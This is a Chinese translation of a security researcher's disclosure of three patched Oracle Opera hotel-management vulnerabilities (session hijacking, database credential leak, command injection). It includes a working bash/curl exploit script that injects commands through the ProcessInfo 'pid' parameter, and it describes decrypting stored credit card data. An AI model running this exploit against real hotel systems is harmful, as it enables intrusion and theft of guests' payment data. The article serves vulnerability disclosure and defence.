> 原文链接: https://www.anquanke.com//post/id/85180 


# 【漏洞分析】Oracle酒店管理平台的远程命令执行和持卡人数据解密漏洞分析


                                阅读量   
                                **105583**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：jackson.thuraisamy.me
                                <br>原文地址：[http://jackson.thuraisamy.me/oracle-opera.html](http://jackson.thuraisamy.me/oracle-opera.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01dbb9493d7a3129d3.png)](https://p0.ssl.qhimg.com/t01dbb9493d7a3129d3.png)

****

**翻译：**[**ResoLutiOn******](http://bobao.360.cn/member/contribute?uid=2606886003)

**预估稿费：200RMB（不服你也来投稿啊！）**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>



**前言**

近期，我发现在一些大型商务酒店所使用的前台数据管理系统（Oracle Opera）中存在多个安全漏洞。黑客可利用这些漏洞，进行酒店订房App提权，以获得更高的用户使用权限；同时还能够进入酒店管理网络的后台数据库及操作系统，实施RCE攻击。攻击者利用这些漏洞，可在未经身份验证的情况下，进入Oracle Opera数据库系统，盗取酒店顾客的身份信息、电话号码等隐私数据。据悉，甲骨文公司（Oracle）已经接到了漏洞相关情况的报告，及时对漏洞进行了修复，并发布了漏洞报告，在其中详细描述了漏洞的具体情况。[[报告传送门]](http://www.oracle.com/technetwork/security-advisory/cpuoct2016verbose-2881725.html#HOSP)

[![](https://p0.ssl.qhimg.com/t019e5e1a89812e0171.jpg)](https://p0.ssl.qhimg.com/t019e5e1a89812e0171.jpg)

<br>

**Oracle Opera系统简介**

Oracle Opera（也称为Opera PMS，前身为Micros Opera）是由甲骨文旗下的子公司Micros为全球范围内各大商务酒店量身打造的一款酒店前台操作系统。它能为酒店管理层和员工提供全方位、系统化的管理工具，以便其能快捷高效地处理客户资料、顾客预订、入住退房、客房分配、房内设施管理以及账户账单管理等日常工作。凯悦（Hyatt）、希尔顿（Hilton）等全球知名酒店使用的均是Opera PMS操作系统。

[![](https://p5.ssl.qhimg.com/t010123a2039349cae1.jpg)](https://p5.ssl.qhimg.com/t010123a2039349cae1.jpg)

在顾客完成费用支付的过程中，该应用程序会将顾客的银行卡的相关信息，包括：PAN码（信用卡账户编号）、失效日期、持卡人姓名等，保存在系统后台的数据库中。目前，相关安全人员已披露了3种能够进入该后台数据库的攻击方式。一旦攻击者拿到了该数据库的登录权限，他便能盗取并解密其中保存的隐私数据。

经过分析后我发现，用户数据之所以会遭到黑客窃取，问题主要出在Opera PMS系统本身，而与用户的操作无关；同时，如果仅使用黑盒测试是无法唯一确定漏洞的性质的。不同于以往的漏洞解决方案（供应商接到漏洞报告，并通过内部测试的方法修复漏洞），由于Opera PMS系统供应商向广大用户提供了详尽的解决方案，这便给黑客攻击Opera PMS系统创造了巨大的空间。攻击者很容易知晓该软件存在的缺陷，并可对其合法性进行分析测试。在经过相应的动态分析和静态分析之后，攻击者便能找到“进入”该系统数据库的最佳切入点。

[![](https://p5.ssl.qhimg.com/t0163365ec0d44914af.png)](https://p5.ssl.qhimg.com/t0163365ec0d44914af.png)

<br>

**漏洞详解**

**No.1 CVE-2016-5665:窃取系统日志文件，实施会话劫持**

[![](https://p5.ssl.qhimg.com/t018599e40b4a18c66a.png)](https://p5.ssl.qhimg.com/t018599e40b4a18c66a.png)

在用户登录Oracle Opera系统后，他们可以选择其中一个系统接口进行交互会话。启动其中接口的请求中包含了用户会话令牌、特定接口启动参数等相关信息。

[![](https://p2.ssl.qhimg.com/t014acc1ec7e0c05cae.png)](https://p2.ssl.qhimg.com/t014acc1ec7e0c05cae.png)

这里存在一个问题，即：由于系统会将用于实现用户交互的会话令牌和其他参数放置在一个目录文件中，而黑客在未经身份验证的情况下，便能通过Web服务器访问该文件。这便是威胁所在。

[![](https://p3.ssl.qhimg.com/t01d1134efedbac0f54.png)](https://p3.ssl.qhimg.com/t01d1134efedbac0f54.png)

而黑客所需要做的便是“守株待兔”，等待一位具有系统管理员身份的用户登录Opera。待该用户登陆成功之后，他便可通过应用程序，拿到系统的所有操作权限，对其中的数据进行任意操作。因为系统管理员具有较高的系统使用权限，能够对数据库中的数据进行查询、修改和删除等重要操作。一旦攻击者拿到了管理员权限，那么数据泄漏则无法避免。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013b37dabc41007dc7.png)

需要说明的是，攻击者往往不会采用上述的方法来窃取用户信息，因为它速度太慢且不够“安全”，容易被识破。系统将用户提交的每一项查询语句保存于应用层。相比于使用Oracle Form提供的用户交互接口，直接与数据库服务器建立连接的方式要快得多，可以提高效率。

**No.2 CVE-2016-5664:攻击者可泄漏系统数据库的凭证信息**

若攻击者与数据库服务器共用一个网络，那么他便可通过构造一个数据库连接字符串的方式，盗取数据库的相关凭证。因为在Oracle Opera系统中，数据库凭证以及服务名等信息，是通过系统向服务器发送一个已经经过验证的HTML请求的方式返回的，用来启用Oracle Forms软件。攻击者在执行一个未经验证的Servlet程序时，便可获得该数据库服务器的主机名。

[![](https://p2.ssl.qhimg.com/t01d1da6577a3c2414e.png)](https://p2.ssl.qhimg.com/t01d1da6577a3c2414e.png)

在拿到数据库的凭证信息后，攻击者便可通过编译简单的连接语句，利用Sql*plus（用户与oracle数据库进行交互的客户端工具），建立与数据库的连接。之后，他便能以管理员的身份登录，骗取系统的信任，对数据库进行实时监控。

[![](https://p5.ssl.qhimg.com/t01b82b3e1e7ea13b12.png)](https://p5.ssl.qhimg.com/t01b82b3e1e7ea13b12.png)

[![](https://p0.ssl.qhimg.com/t01ab160c8932c901d2.png)](https://p0.ssl.qhimg.com/t01ab160c8932c901d2.png)

**No.3 CVE-2016-5663:通过系统命令注入，实施RCE攻击**

在以下两种情况中，攻击者可利用该RCE漏洞：

（1）攻击者仅能获取到应用程序服务器的登录权限（例如：Internet Exposure）；     

（2）攻击者仅能通过应用程序服务器连接到数据库；

以上便是我在调查过程中，得出的最满意的结果。因为以上二者看似无关，但将它们结合在一起，便能揭示出攻击者的恶意企图。

在系统中含有一个判断数据传输过程正误的程序。在数据传输完成后，它将会给系统返回确认信息，例如：网络端口号（PID）等。而在黑盒测试中，PID参数是放在一个用于执行系统指令的字符串中，不容易被察觉。攻击者可按下图所示的步骤进行操作：修改该参数来执行另一个命令，并可通过web服务器将输出结果放入另一个可读取的文件中。

[![](https://p4.ssl.qhimg.com/t01499edbabb1718387.png)](https://p4.ssl.qhimg.com/t01499edbabb1718387.png)

若一切顺利，该程序会输出结果whoami，并将其放在webtemp文件下。若运行出错，那么系统将会提示“找不到相应文件”的错误信息。

[![](https://p5.ssl.qhimg.com/t011c990f0a043b2840.png)](https://p5.ssl.qhimg.com/t011c990f0a043b2840.png)

在浏览了该程序的编译代码后，我们会发现出错之处（即下图内红框标识部分）。在编译好的代码中包含了pslist工具（pslist：查看系统进程，是一个属性文件）的运行路径。该文件的存储路径经过硬编码处理，为：D:microsoperaoperaiasdefault.env，但我按此路径查找后发现，该文件并不存在。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01985030a8f1bff6a0.png)

为了修改这一错误，需要进行以下两步操作：

（1）在系统中找到OPERA_HOME属性的值；

（2）将其保存到D:microsoperaoperaiasdefault.env.路径下。

巧合地是，我在系统中发现了另一个诊断程序，它能够查看OPERA_HOME属性信息。如下图所示：

[![](https://p3.ssl.qhimg.com/t01a46e711b3ba0df01.png)](https://p3.ssl.qhimg.com/t01a46e711b3ba0df01.png)

接着，我们便可将刚才那个Servlet程序作为RFI载体，上传至目标路径：

[![](https://p2.ssl.qhimg.com/t01683768979423bf58.png)](https://p2.ssl.qhimg.com/t01683768979423bf58.png)

  我利用ProcessInfo程序检查之后发现，该错误已经修改了。同时，系统给出的输出结果“whoami”也证实了该应用程序能够正常运行了。

[![](https://p2.ssl.qhimg.com/t0176e214672b660762.png)](https://p2.ssl.qhimg.com/t0176e214672b660762.png)

下面的脚本程序可用于验证操作：



```
#!/bin/bash
STDOUT="D:microsoperaoperaiaswebtemptemp.log"
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 &lt;host&gt; &lt;command&gt;"
    echo "E.g. : $0 http://opera.example.biz whoami"
    exit 1
else
    host="$1"
    cmd="$2"
fi
# Activate exploit.
curl -s -XPOST --data-binary "OPERA_HOME=D:microsopera" "$host/Operajserv/webarchive/FileReceiver?filename=D:/micros/opera/operaias/default.env&amp;crc=26&amp;append=false" &gt; /dev/null
# Inject command.
curl -s -G --data-urlencode "pid=1 &amp; $cmd &gt; "$STDOUT" 2" "$host/Operajserv/webarchive/ProcessInfo" &gt; /dev/null
curl -# -G "$host/webtemp/temp.log"
# Deactivate exploit.
curl -s -G --data-urlencode "pid=1 &amp; del "$STDOUT" 2" "$host/Operajserv/webarchive/ProcessInfo" &gt; /dev/null
curl -s -G --data-urlencode 'pid=1 &amp; del "D:microsoperaoperaiasdefault.env" 2' "$host/Operajserv/webarchive/ProcessInfo" &gt; /dev/null
```

持卡人信息解密：

利用上述我所讲的漏洞利用过程，攻击者可拿到数据库的登录权限，从任何一个未经授权的接口进入Oracle Opera系统数据库，进而能够窃取银行卡持卡人的私密数据，并对其进行解密。

在SQL中，用于查询数据包包体（package body）的命令语句如下所示：

[![](https://p2.ssl.qhimg.com/t01da1605c3cfa39465.png)](https://p2.ssl.qhimg.com/t01da1605c3cfa39465.png)

由于包体信息容易与其他信息混淆，因而，攻击者便可进一步检索包体的信息，或是用其来“破解”出3DES算法的密钥。

[![](https://p3.ssl.qhimg.com/t016e2a90d76ac5c873.png)](https://p3.ssl.qhimg.com/t016e2a90d76ac5c873.png)

现在，算法和密钥都已经得知了，攻击者的下一步操作便是找到加密数据的存储位置。他能在Opera资料库中获得这些信息。

[![](https://p0.ssl.qhimg.com/t014837cd08b2631f13.png)](https://p0.ssl.qhimg.com/t014837cd08b2631f13.png)

一项能够用于查询NAMES_CREDIT_CARD表中数据的查询语句，能够显示出用户名和其他加密的银行卡信息。同时，攻击者还可通过一个脚本程序，将加密信息解析为明文。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0103aa6dc42d28bf63.png)



**后记**

我对甲骨文公司发布的漏洞报告感到非常满意，漏洞描述很详尽。同时，在我向甲骨文公司提交了关于PGP公钥安全漏洞报告的24小时之内，他们便给予了我回应。对此，我感到很欣慰。同时，甲骨文公司还表示，他们将会在下一次发布软件补丁更新包时，加入对CVE-2016-5663、CVE-2016-5664以及CVE-2016-5665等3个漏洞进行修复的程序。
